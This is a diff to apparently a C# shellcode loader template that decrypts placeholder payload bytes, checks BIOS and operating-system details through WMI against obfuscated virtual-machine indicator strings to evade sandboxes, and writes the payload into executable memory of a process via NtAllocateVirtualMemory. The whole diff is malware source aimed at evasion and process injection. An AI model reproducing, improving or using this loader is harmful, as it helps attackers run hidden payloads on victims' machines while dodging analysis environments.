@@ -35,11 +35,11 @@ class Program
         {
             Console.WriteLine("[*] Starting program...");
 
-            // if (IsVirtualMachine())
-            // {
-            //     Console.WriteLine("[!] VM detected, exiting...");
-            //     return;
-            // }
+           //  if (IsVirtualMachine())
+           //  {
+           //      Console.WriteLine("[!] VM detected, exiting...");
+           //      return;
+           //  }
 
             byte[] encrypted = %%ENCRYPTED_BYTES%%;
             byte[] key = %%KEY_BYTES%%;
@@ -97,6 +97,7 @@ class Program
             Deobfuscate(new[] { 21, 34, 43, 45, 46, 26, 37 }),
             Deobfuscate(new[] { 21, 27, 40, 49 }),
             Deobfuscate(new[] { 23, 30, 39 }),
+            Deobfuscate(new[] { 18, 15, 52 }),
             Deobfuscate(new[] { 16, 4, 12, 20 }),
             Deobfuscate(new[] { 12, 34, 28, 43, 40, 44, 40, 31, 45 }),
             Deobfuscate(new[] { 7, 50, 41, 30, 43, 63, 21 }),
@@ -104,32 +105,39 @@ class Program
             Deobfuscate(new[] { 6, 40, 40, 32, 37, 30 })
         };
 
-        string biosInfo = "";
+        string Info = "";
         try
         {
-            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
-            {
-                foreach (ManagementObject obj in searcher.Get())
-                {
-                    biosInfo += obj["Manufacturer"]?.ToString() ?? "";
-                    biosInfo += obj["SMBIOSBIOSVersion"]?.ToString() ?? "";
-                    biosInfo += obj["Name"]?.ToString() ?? "";
 
-                    Console.WriteLine($"  Manufacturer: {obj["Manufacturer"]}");
-                    Console.WriteLine($"  Name: {obj["Name"]}");
-                    Console.WriteLine($"  Version: {obj["SMBIOSBIOSVersion"]}");
-                }
-            }
+var biosSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS");
+foreach (ManagementObject obj in biosSearcher.Get())
+{
+    Info += obj["Manufacturer"]?.ToString() ?? "";
+    Info += obj["SMBIOSBIOSVersion"]?.ToString() ?? "";
+Console.WriteLine($"  Manufacturer: {obj["Manufacturer"]}");
+Console.WriteLine($"  Version: {obj["SMBIOSBIOSVersion"]}");
+
+}
+
+var osSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
+foreach (ManagementObject obj in osSearcher.Get())
+{
+    Info += obj["Caption"]?.ToString() ?? "";
+    Info += obj["Version"]?.ToString() ?? "";
+    Console.WriteLine($"OS Name: {obj["Caption"]}");
+    Console.WriteLine($"OS Version: {obj["Version"]}");
+
+}
         }
         catch (Exception ex)
         {
             Console.WriteLine("[!] VM check exception: " + ex.Message);
         }
 
-        biosInfo = biosInfo.ToLower();
+        Info = Info.ToLower();
         foreach (string indicator in vmIndicators)
         {
-            if (biosInfo.Contains(indicator.ToLower()))
+            if (Info.Contains(indicator.ToLower()))
             {
                 Console.WriteLine("[!] Virtual Machine detected based on BIOS info: " + indicator);
                 return true;
@@ -232,7 +240,7 @@ class Program
         IntPtr len = (IntPtr)payload.Length;
         st = alloc(hProc, ref addr, IntPtr.Zero, ref len, 0x3000, 0x40);
         if (st != Win32.NTSTATUS.Success)
-            throw new Exception("xNtAllocateVirtualMemoryx failed");
+            throw new Exception($"xNtAllocateVirtualMemoryx failed, NTSTATUS=0x{((uint)st):X}");
 
         st = write(hProc, addr, payload, payload.Length, out _);
         if (st != Win32.NTSTATUS.Success)
